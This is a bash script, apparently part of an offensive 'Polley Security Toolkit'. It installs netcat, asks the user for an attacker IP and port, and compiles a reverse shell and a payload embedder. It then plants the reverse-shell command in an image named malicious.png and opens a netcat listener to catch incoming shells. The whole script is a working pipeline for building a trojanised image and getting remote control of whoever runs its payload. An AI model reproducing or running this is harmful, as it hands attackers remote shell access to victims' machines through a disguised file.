#!/bin/bash

# 1. Dependency & File Check
echo "[*] Checking environment..."
if ! ldconfig -p | grep -q libpng; then
    echo "[!] libpng not found. Installing..."
    sudo apt update && sudo apt install libpng-dev netcat-traditional wget -y
fi

# 2. Auto-Restore Missing Base Image
if [ ! -f "benign.png" ]; then
    echo "[!] benign.png missing. Downloading base image..."
    wget -q -O benign.png https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png
fi

# 3. User Input for Customization
echo "--- Polley Security Toolkit ---"
read -p "Enter your IP address (LHOST): " MY_IP
read -p "Enter your Port (LPORT) [default 4444]: " MY_PORT
MY_PORT=${MY_PORT:-4444}

# 4. Clean Compilation
echo "[*] Compiling binaries..."
gcc reverse_shell.c -o reverse_shell
if [ $? -ne 0 ]; then echo "[!] Error compiling reverse_shell.c"; exit 1; fi

gcc embed_payload.c -o embed_payload -lpng
if [ $? -ne 0 ]; then echo "[!] Error compiling embed_payload.c. Is libpng-dev installed?"; exit 1; fi

# 5. Execution & Embedding
echo "[*] Creating malicious.png for IP: $MY_IP"
./embed_payload benign.png malicious.png "./reverse_shell $MY_IP $MY_PORT"

if [ -f "malicious.png" ]; then
    echo "[+] SUCCESS: malicious.png created."
    echo "[*] Starting listener on port $MY_PORT..."
    echo "[*] (Press CTRL+C to stop when finished)"
    nc -lvnp $MY_PORT
else
    echo "[!] ERROR: Failed to create malicious.png. Check your C code."
fi
